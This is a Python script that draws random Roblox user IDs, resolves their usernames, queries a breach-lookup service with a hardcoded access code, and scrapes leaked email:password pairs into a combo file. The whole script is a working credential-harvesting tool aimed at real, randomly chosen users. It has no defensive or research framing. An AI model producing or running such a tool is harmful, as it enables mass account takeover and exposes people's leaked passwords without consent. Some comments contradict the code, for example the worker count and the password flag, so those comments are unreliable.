import requests
import logging
import time
import random
import concurrent.futures
from bs4 import BeautifulSoup
from colorama import init, Fore
from threading import Lock

# Initialize colorama for colored output
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Configuration
BETA_SNUSBASE_URL = "https://beta.snusbase.com/"  # Beta SnusBase URL
SNUSBASE_CODE = "sbmeovhou6ecsn9fd9wcwnwwvsvwnc"  # Beta SnusBase code
ROBLOX_API_URL = "https://users.roblox.com/v1/users/"  # Roblox API URL
OUTPUT_FILE = "br.txt"  # Output file for email:password combos

# Shared state for rate-limiting (lock to control shared state)
rate_limit_lock = Lock()
global_rate_limit_triggered = False

# Set to track seen email:password combos to avoid duplicates
seen_combos = set()

# Max retries before giving up
MAX_RETRIES = 3

# Function to fetch Roblox user data
def fetch_roblox_user(user_id, retry_count=0):
    """Fetch Roblox user data using the Roblox API."""
    global global_rate_limit_triggered

    try:
        response = requests.get(f"{ROBLOX_API_URL}{user_id}")
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 429:  # Rate limited
            logging.warning(f"{Fore.RED}Rate limit encountered for user ID {user_id}. Retrying...")
            # If retry limit is not reached, retry
            if retry_count < MAX_RETRIES:
                time.sleep(10)  # Delay before retry
                return fetch_roblox_user(user_id, retry_count + 1)
            else:
                # If exceeded retry count, log and proceed
                logging.error(f"{Fore.RED}Max retries exceeded for user ID {user_id}. Skipping.")
                return None
        else:
            logging.warning(f"{Fore.YELLOW}Failed to fetch user ID {user_id}. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Request error for Roblox user ID {user_id}: {e}")
        return None

# Function to fetch breach data from Beta SnusBase
def fetch_breach_data(term, retry_count=0):
    """Fetch breach data for a given search term from Beta SnusBase."""
    global global_rate_limit_triggered

    try:
        response = requests.post(BETA_SNUSBASE_URL, data={
            'snusbase_code': SNUSBASE_CODE,
            'terms': term,
            'password': 'off',  # Only fetch passwords
            'name': 'on'
        })
        if response.status_code == 200:
            return response.text
        elif response.status_code == 429:  # Rate limited
            logging.warning(f"{Fore.RED}Rate limit encountered for term '{term}'. Retrying...")
            # If retry limit is not reached, retry
            if retry_count < MAX_RETRIES:
                time.sleep(1)  # Delay before retry
                return fetch_breach_data(term, retry_count + 1)
            else:
                # If exceeded retry count, log and proceed
                logging.error(f"{Fore.RED}Max retries exceeded for term '{term}'. Skipping.")
                return None
        else:
            logging.warning(f"{Fore.YELLOW}Failed to fetch breach data for term '{term}'. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Request error for breach data: {e}")
        return None

# Function to extract email:password combos from SnusBase response
def extract_email_password_combos(response_text):
    """Extract email:password combos from Beta SnusBase response."""
    global seen_combos
    soup = BeautifulSoup(response_text, 'html.parser')
    combos = []

    emails = soup.find_all('span', string='email')
    passwords = soup.find_all('span', string='password')

    for email, password in zip(emails, passwords):
        email_value = email.find_next('span').text.strip()
        password_value = password.find_next('span').text.strip()
        if email_value and password_value:
            combo = f"{email_value}:{password_value}"
            if combo not in seen_combos:
                seen_combos.add(combo)
                combos.append(combo)
    return combos

# Function to save email:password combos to a file
def save_to_file(combos):
    """Save email:password combos to the output file."""
    with open(OUTPUT_FILE, "a") as f:
        for combo in combos:
            f.write(combo + "\n")

# Function to process a single Roblox user
def process_user(user_id):
    """Process a single Roblox user ID."""
    user_data = fetch_roblox_user(user_id)
    if user_data:
        username = user_data.get("name")
        if username:
            logging.info(f"{Fore.CYAN}Checking breaches for Roblox username: {username}")
            response_text = fetch_breach_data(username)
            if response_text:
                combos = extract_email_password_combos(response_text)
                if combos:
                    save_to_file(combos)
                    logging.info(f"{Fore.GREEN}Saved {len(combos)} combos for username: {username}")
                else:
                    logging.info(f"{Fore.YELLOW}No combos found for username: {username}")

# Function to generate random Roblox user IDs
def generate_random_ids(count):
    """Generate a list of random Roblox user IDs."""
    return [random.randint(100000, 10000000) for _ in range(count)]

# Main function
def main():
    logging.info(f"{Fore.BLUE}Starting breach checks...")
    user_ids = generate_random_ids(100000)  # Generate random user IDs
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Use 100 workers
        executor.map(process_user, user_ids)
    logging.info(f"{Fore.GREEN}Breach checks completed. Results saved to '{OUTPUT_FILE}'.")

if __name__ == "__main__":
    main()
